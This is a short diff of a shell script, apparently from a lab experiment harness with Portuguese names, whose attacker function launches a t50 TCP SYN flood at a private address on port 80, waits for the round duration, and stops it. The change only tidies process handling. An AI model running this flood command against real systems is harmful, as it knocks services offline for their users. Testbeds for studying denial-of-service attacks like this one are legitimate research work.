@@ -293,15 +293,16 @@ function runAtacante() {
   ethtool -s eth0 speed 10 duplex full
   logProcess $numRodada $tipoDeExperimento "Ethtool eth0" $?
 
-  t50 192.168.0.200 --flood --turbo --dport 80 -S --protocol TCP > /dev/null 2>&1 & pid=$!
-  checkPid $pid
+  t50 192.168.0.200 --flood --turbo --dport 80 -S --protocol TCP > /dev/null 2>&1 & t50_pid=$!
+  checkPid $t50_pid
   logProcess $numRodada $tipoDeExperimento "t50" $?
 
   # Duração do ataque (Duração do experimento)
   sleep $durRodada
   logProcess $numRodada $tipoDeExperimento "Sleep $durRodada" $?
 
-  killall t50 > /dev/null
+  kill $t50_pid 
+  wait $t50_pid > /dev/null 2>&1
   logProcess $numRodada $tipoDeExperimento "Killall t50" $?
 }
 
